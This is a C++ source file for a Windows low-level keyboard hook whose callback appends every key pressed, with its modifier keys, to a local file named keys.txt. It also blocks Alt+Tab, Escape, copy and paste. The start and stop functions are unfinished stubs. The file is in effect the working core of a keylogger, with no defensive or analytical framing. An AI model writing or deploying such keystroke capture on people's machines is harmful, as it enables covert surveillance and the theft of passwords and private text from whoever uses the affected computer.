#include "KeyboardHooking.h"
#include <Windows.h>

void KeyboardHooking::StartKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::StopKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::MsgLoop()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

LRESULT CALLBACK KeyboardHooking::KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0 || code != HC_ACTION)
		return CallNextHookEx(NULL, code, wParam, lParam);

	std::ofstream key_file;
	std::ofstream err_file;
	key_file.open("keys.txt", std::ios::app);
	err_file.open("error.txt", std::ios::app);
	if (!key_file.is_open())
		err_file << "Could not open the key_file!\n";

	//get the key from lParam
	PKBDLLHOOKSTRUCT key_param = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code

	BOOL bControlKeyDown
		= GetAsyncKeyState(VK_CONTROL) >> ((sizeof(SHORT) * 8) - 1);//checks if ctrl key is pressed

	BOOL bShiftKeyDown
		= GetAsyncKeyState(VK_SHIFT) >> ((sizeof(SHORT) * 8) - 1);//checks if shift key is pressed

	if (key_param->vkCode == VK_TAB && key_param->flags & LLKHF_ALTDOWN) return 1; // ALT + TAB
	if (key_param->vkCode == VK_ESCAPE) return 1; // ESCAPE
	if (bControlKeyDown && key_param->vkCode == 0x43) return 1; // CTRL C
	if (bControlKeyDown && key_param->vkCode == 0x56) return 1; // CTRL V
	if (bControlKeyDown && key_param->vkCode == VK_INSERT) return 1; // CRTL INS
	if (bShiftKeyDown && key_param->vkCode == VK_INSERT) return 1; // SHIFT INS
	if (bShiftKeyDown && bControlKeyDown && key_param->vkCode == VK_RETURN) return 1; // CTRL SHIFT ENTER
	
	if (wParam == WM_KEYDOWN)
	{
		if (key_param->flags & LLKHF_ALTDOWN)
				key_file << " ALT " << key[key_param->vkCode].GetKeyName() << " ";

		if (bControlKeyDown)
			key_file << "CTRL ";

		if (bShiftKeyDown)
			key_file << "SHIFT ";

		std::map <UINT, KeyPair>::iterator it;

		it = key.find(key_param->vkCode);

		if (it == key.end())
			key_file << " vk_code: " << std::to_string(key_param->vkCode);

		if (it != key.end())
			key_file << key[key_param->vkCode].GetKeyName() << " ";
	}

	key_file.close();
	err_file.close();
	return CallNextHookEx(NULL, code, wParam, lParam);
}




